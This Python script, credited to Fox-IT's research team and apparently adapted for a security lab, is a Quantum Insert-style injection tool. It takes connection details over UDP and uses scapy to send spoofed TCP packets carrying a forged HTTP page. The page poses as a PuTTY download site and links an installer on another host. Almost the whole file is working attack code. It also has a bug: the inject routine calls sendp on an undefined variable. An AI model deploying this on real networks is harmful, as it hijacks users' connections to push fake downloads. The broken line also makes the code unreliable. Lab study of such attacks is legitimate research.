#!/usr/bin/env python
#
# file:     shooter.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# shooter.py, used to receive TCP seq+ack data and sending spoofed packet
#

# Python imports
from monitor import QuantumTip, TIP_LEN, TIP_STRUCT
from scapy.all import *
import sys
import struct
import socket
import argparse

# Scapy imports
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Local imports
PAYLOAD_PUTTY_BODY = '<!doctype html>\r\n<html lang="en">\r\n<head>\r\n<meta charset="utf-8">\r\n<title>NetSec PuTTY download</title>\r\n</head>\r\n<body>\r\n<h1>NetSec PuTTY Client Download</h1>\r\n<p>Download our secure PuTTY client here:</p>\r\n<p id="putty_download"><a href="http://cantillon.netsec.seclab-bonn.de">putty-64bit-0.71-installer.msi</a> (SHA-256: aa)</p>\r\n<p>Do not forget to verify the hash after downloading the installer CCCCCCCCCCCC!</p>\r\n</body>\r\n</html>\r\n'
PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 17:29:05 GMT\r\nContent-Type: text/html\r\nContent-Length: ' + \
    str(len(PAYLOAD_PUTTY_BODY)) + \
    '\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nConnection: keep-alive\r\nETag: "60770091-208"\r\nAccept-Ranges: bytes\r\n\r\n'
PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY


class QI(object):
    def inject(self, src, dst, sport, dport, seq, ack):
        payload = PAYLOAD_PUTTY
        p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport,
                                       seq=seq+1, ack=ack, flags="PA") / payload
        send(p)
        sendp(packet, iface="eth0")
        print('Shooting: %r' % p)


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-l", "--listen", default="0.0.0.0",
                        help="listen on specified ip")
    parser.add_argument("-p", "--port", type=int, default=1111,
                        help="listen on specified (udp) port")

    args = parser.parse_args()

    qi = QI()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.listen, args.port))

    print('Shooter listening on %s:%u' % (args.listen, args.port))

    while True:
        data, addr = sock.recvfrom(1024)
        if len(data) == TIP_LEN:
            tip = QuantumTip._make(struct.unpack(TIP_STRUCT, data))
            print('Received tip from %r: %r' % (addr, tip))
            qi.inject(
                src=socket.inet_ntoa(struct.pack(">I", tip.src)),
                dst=socket.inet_ntoa(struct.pack(">I", tip.dst)),
                sport=tip.sport,
                dport=tip.dport,
                seq=tip.seq,
                ack=tip.ack,
            )


if __name__ == '__main__':
    sys.exit(main())
